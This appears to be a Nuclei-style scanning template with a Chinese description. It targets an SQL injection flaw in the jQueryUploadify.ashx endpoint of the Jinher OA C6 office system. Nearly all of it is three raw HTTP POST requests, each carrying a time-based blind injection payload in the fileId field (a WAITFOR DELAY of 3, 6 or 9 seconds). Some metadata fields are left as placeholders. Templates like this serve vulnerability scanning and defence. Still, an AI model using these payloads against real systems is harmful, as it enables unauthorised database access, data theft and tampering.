id: jinher-c6-jQueryUploadify-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 金和OA-C6系统接口jQueryUploadify.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
  reference:
    - https://github.com/wy876/POC/commit/2fdfb36b6f8f039319461fd394e980d959ca062e
  tags: tags
http:
  - raw:
      - |-
        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 46

        type=delete&fileId=-99';WAITFOR+DELAY'0:0:3'--
      - |-
        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 46

        type=delete&fileId=-99';WAITFOR+DELAY'0:0:6'--
      - |-
        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 46

        type=delete&fileId=-99';WAITFOR+DELAY'0:0:9'--
